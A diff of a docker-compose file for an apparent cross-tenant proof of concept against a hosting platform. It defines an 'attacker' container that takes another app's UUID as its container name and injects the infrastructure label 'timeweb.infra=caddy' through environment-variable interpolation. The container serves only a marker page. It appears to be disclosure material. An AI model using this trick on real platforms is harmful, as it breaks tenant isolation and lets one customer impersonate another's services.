@@ -1,20 +1,7 @@
 services:
   attacker:
     image: alpine
-    command:
-      - sh
-      - -c
-      - |
-        mkdir -p /www
-        HOSTNAME=$(hostname)
-        cat > /www/index.html <<HTMLEOF
-        container_name: 111c4266-47a4-41b1-adcb-185fed196c91_00000000-fake-deploy-cross-tenant-poc
-        hostname: $HOSTNAME
-        target_app_uuid: 111c4266-47a4-41b1-adcb-185fed196c91
-        label_bypass: timeweb.infra=caddy (via env interpolation)
-        started_at: $(date -u +%Y-%m-%dT%H:%M:%SZ)
-        HTMLEOF
-        httpd -f -p 8080 -h /www
+    command: ["sh", "-c", "mkdir /www && echo 'PoC container alive | container_name=111c4266-47a4-41b1-adcb-185fed196c91_00000000-fake-deploy-cross-tenant-poc | label=${A}=caddy' > /www/index.html && httpd -f -p 8080 -h /www"]
     container_name: 111c4266-47a4-41b1-adcb-185fed196c91_00000000-fake-deploy-cross-tenant-poc
     ports:
       - "8080:8080"
